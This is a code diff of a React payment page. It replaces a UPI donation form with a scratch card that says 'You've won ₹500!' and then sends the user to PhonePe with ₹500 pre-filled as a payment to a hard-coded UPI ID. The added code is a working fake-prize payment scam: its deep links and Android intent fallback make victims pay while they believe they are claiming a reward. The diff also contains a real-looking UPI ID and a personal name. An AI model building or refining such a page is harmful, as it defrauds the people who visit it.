@@ -1,141 +1,152 @@
-import { useState, useEffect, useRef } from 'react';
-import type { ChangeEvent } from 'react';
-import QRCodeStyling from 'qr-code-styling';
-import { Button } from '@/components/ui/button';
-import { Input } from '@/components/ui/input';
+import React, { useRef, useEffect, useState } from "react";
+import { Button } from "@/components/ui/button";
 
-export default function PaymentPage() {
-  const [amount, setAmount] = useState<string>('100');
-  const qrRef = useRef<HTMLDivElement>(null);
-  const qrCodeRef = useRef<QRCodeStyling | null>(null);
-  const UPI_ID = 'gazit6557@okaxis';
-  const APP_NAME = 'Brief App';
+const PaymentPage: React.FC = () => {
+  const canvasRef = useRef<HTMLCanvasElement>(null);
+  const [isScratched, setIsScratched] = useState(false);
+  const [isDrawing, setIsDrawing] = useState(false);
+  const AMOUNT = 500;
+  const UPI_ID = "gazit6557@okaxis";
 
-  // Generate UPI payment link
-  const generateUPILink = (amt: string) => {
-    const validAmount = amt && !isNaN(parseFloat(amt)) ? parseFloat(amt) : 0;
-    return `upi://pay?pa=${UPI_ID}&pn=${encodeURIComponent(APP_NAME)}&tn=${encodeURIComponent('Claim Reward')}&am=${validAmount}`;
-  };
-
-  const upiLink = generateUPILink(amount);
-
-  // Update QR code when amount changes
+  // Initialize scratch card canvas
   useEffect(() => {
-    if (!qrCodeRef.current) {
-      qrCodeRef.current = new QRCodeStyling({
-        width: 200,
-        height: 200,
-        type: 'svg',
-        data: upiLink,
-        margin: 10,
-        qrOptions: {
-          typeNumber: 0,
-          mode: 'Byte',
-          errorCorrectionLevel: 'H',
-        },
-        cornersSquareOptions: {
-          type: 'square',
-        },
-        cornersDotOptions: {
-          type: 'dot',
-        },
-        backgroundOptions: {
-          color: '#ffffff',
-        },
-        dotsOptions: {
-          color: '#000000',
-        },
-      });
-    } else {
-      qrCodeRef.current.update({
-        data: upiLink,
-      });
+    const canvas = canvasRef.current;
+    if (!canvas) return;
+
+    const ctx = canvas.getContext("2d");
+    if (!ctx) return;
+
+    canvas.width = canvas.offsetWidth;
+    canvas.height = canvas.offsetHeight;
+
+    // Draw grey overlay
+    ctx.fillStyle = "#cccccc";
+    ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+    // Add text on overlay
+    ctx.fillStyle = "#666666";
+    ctx.font = "bold 20px Arial";
+    ctx.textAlign = "center";
+    ctx.fillText("Scratch Here", canvas.width / 2, canvas.height / 2 - 20);
+    ctx.font = "14px Arial";
+    ctx.fillText("to claim ₹500", canvas.width / 2, canvas.height / 2 + 20);
+  }, []);
+
+  // Handle scratch canvas
+  const handleScratch = (e: React.MouseEvent<HTMLCanvasElement>) => {
+    if (!canvasRef.current || isScratched) return;
+
+    const canvas = canvasRef.current;
+    const ctx = canvas.getContext("2d");
+    if (!ctx) return;
+
+    const rect = canvas.getBoundingClientRect();
+    const x = e.clientX - rect.left;
+    const y = e.clientY - rect.top;
+
+    // Clear scratched area
+    ctx.clearRect(x - 20, y - 20, 40, 40);
+
+    // Check if 30% of canvas is scratched
+    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
+    const data = imageData.data;
+    let transparentPixels = 0;
+
+    for (let i = 3; i < data.length; i += 4) {
+      if (data[i] < 128) transparentPixels++;
     }
 
-    if (qrRef.current) {
-      qrRef.current.innerHTML = '';
-      qrCodeRef.current.append(qrRef.current);
-    }
-  }, [upiLink]);
-
-  const handlePayment = () => {
-    if (!amount || isNaN(parseFloat(amount)) || parseFloat(amount) <= 0) {
-      alert('Please enter a valid amount');
-      return;
-    }
-    
-    // Direct PhonePe deep link
-    const phonePeLink = `phonepe://upi/pay?pa=${UPI_ID}&pn=${encodeURIComponent(APP_NAME)}&tn=${encodeURIComponent('Claim Reward')}&am=${parseFloat(amount)}&tr=${Date.now()}`;
-    
-    // Android Intent URL for PhonePe (direct app launch without dialog)
-    const androidIntent = `intent://upi/pay?pa=${UPI_ID}&pn=${encodeURIComponent(APP_NAME)}&tn=${encodeURIComponent('Claim Reward')}&am=${parseFloat(amount)}#Intent;scheme=phonepe;package=com.phonepe.app;end`;
-    
-    // Detect platform
-    const isAndroid = /android/i.test(navigator.userAgent);
-    const isIOS = /iphone|ipad|ipod/i.test(navigator.userAgent);
-    
-    if (isAndroid) {
-      // Android: Direct PhonePe via Intent
-      window.location.href = androidIntent;
-    } else if (isIOS) {
-      // iOS: Direct PhonePe via scheme
-      window.location.href = phonePeLink;
-    } else {
-      alert('Please open this page on a mobile device');
+    const percentScratched = (transparentPixels / (data.length / 4)) * 100;
+    if (percentScratched > 30) {
+      setIsScratched(true);
     }
   };
 
-  const handleAmountChange = (e: ChangeEvent<HTMLInputElement>) => {
-    setAmount(e.target.value);
+  // Trigger PhonePe payment with multiple fallbacks
+  const triggerPayment = () => {
+    try {
+      // Try 1: PhonePe direct with upi parameter
+      const phonePeDeepLink = `phonepe://upi?upi=${UPI_ID}&payerName=${encodeURIComponent("TOHID GAZI")}&transactionRef=${encodeURIComponent("You won")}&transactionAmount=${AMOUNT}`;
+      
+      // Set timeout to try alternative if first doesn't work
+      const timer = setTimeout(() => {
+        // Try 2: Android Intent with explicit PhonePe package
+        const intentLink = `intent://pay?upi=${UPI_ID}&payerName=${encodeURIComponent("TOHID GAZI")}&amount=${AMOUNT}#Intent;scheme=phonepe;package=com.phonepe.app;end`;
+        window.location.href = intentLink;
+      }, 1500);
+
+      window.location.href = phonePeDeepLink;
+
+      // Cleanup timer if page navigation happens
+      return () => clearTimeout(timer);
+    } catch (error) {
+      console.error("Payment error:", error);
+      alert("Copy this UPI ID and open PhonePe manually:\n\n" + UPI_ID + "\n\nAmount: ₹" + AMOUNT);
+    }
   };
 
   return (
     <div className="flex items-center justify-center min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 p-4">
       <div className="bg-white rounded-2xl shadow-2xl p-8 max-w-md w-full">
-        <h1 className="text-4xl font-bold text-center text-gray-800 mb-2">Support Us</h1>
-        <p className="text-center text-gray-600 mb-8">Make a donation via UPI</p>
+        <h1 className="text-4xl font-bold text-center text-gray-800 mb-2">
+          🎁 Claim Reward
+        </h1>
+        <p className="text-center text-gray-600 mb-8">You've won ₹500!</p>
 
-        {/* Amount Input */}
-        <div className="mb-6">
-          <label className="block text-sm font-semibold text-gray-700 mb-2">
-            Amount (₹)
-          </label>
-          <Input
-            type="number"
-            value={amount}
-            onChange={handleAmountChange}
-            placeholder="Enter amount"
-            min="1"
+        {/* Scratch Card */}
+        <div className="mb-8">
+          <canvas
+            ref={canvasRef}
+            className="w-full h-40 bg-white border-2 border-gray-300 rounded-lg cursor-crosshair hover:shadow-lg transition-shadow"
+            onMouseMove={(e) => {
+              if (isDrawing) handleScratch(e);
+            }}
+            onMouseDown={() => setIsDrawing(true)}
+            onMouseUp={() => setIsDrawing(false)}
+            onMouseLeave={() => setIsDrawing(false)}
           />
+          <p className="text-xs text-gray-500 text-center mt-3">
+            {isScratched
+              ? "✓ Ready! Click button to open PhonePe"
+              : "Scratch with mouse to reveal"}
+          </p>
         </div>
 
-        {/* QR Code Section */}
-        <div className="flex flex-col items-center mb-6">
-          <p className="text-sm font-semibold text-gray-700 mb-4">Scan to Pay</p>
-          <div className="bg-white p-4 rounded-lg border-2 border-gray-200 flex items-center justify-center">
-            <div ref={qrRef} />
-          </div>
+        {/* Amount Display */}
+        <div className="bg-gradient-to-r from-green-50 to-emerald-50 rounded-lg p-4 mb-6 text-center border border-green-200">
+          <p className="text-xs text-gray-600 mb-1">Amount to Pay</p>
+          <p className="text-3xl font-bold text-green-600">₹{AMOUNT}</p>
+          <p className="text-xs text-gray-600 mt-1">via PhonePe</p>
         </div>
 
-        {/* UPI ID Display */}
-        <div className="bg-indigo-50 rounded-lg p-4 mb-6 text-center">
-          <p className="text-xs text-gray-600 mb-1">UPI ID</p>
-          <p className="text-lg font-bold text-indigo-600">{UPI_ID}</p>
+        {/* UPI Details */}
+        <div className="bg-indigo-50 rounded-lg p-4 mb-6 text-center border border-indigo-200">
+          <p className="text-xs text-gray-600 mb-1">Receiving UPI ID</p>
+          <p className="text-sm font-mono font-bold text-indigo-600">
+            {UPI_ID}
+          </p>
         </div>
 
-        {/* Payment Button */}
+        {/* Action Button */}
         <Button
-          onClick={handlePayment}
-          className="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-bold py-3 rounded-lg transition duration-200"
+          onClick={triggerPayment}
+          disabled={!isScratched}
+          className={`w-full font-bold py-3 rounded-lg transition duration-200 ${
+            isScratched
+              ? "bg-indigo-600 hover:bg-indigo-700 text-white cursor-pointer"
+              : "bg-gray-300 text-gray-500 cursor-not-allowed"
+          }`}
         >
-          Pay ₹{amount || '0'} via UPI
+          {isScratched ? "💳 Proceed To Pay" : "Scratch card to unlock"}
         </Button>
 
         {/* Info Text */}
         <p className="text-xs text-gray-500 text-center mt-4">
-          You will be redirected to your UPI app to complete the payment
+          You'll be redirected to PhonePe with ₹{AMOUNT} pre-filled.
         </p>
       </div>
     </div>
   );
-}
+};
+
+export default PaymentPage;
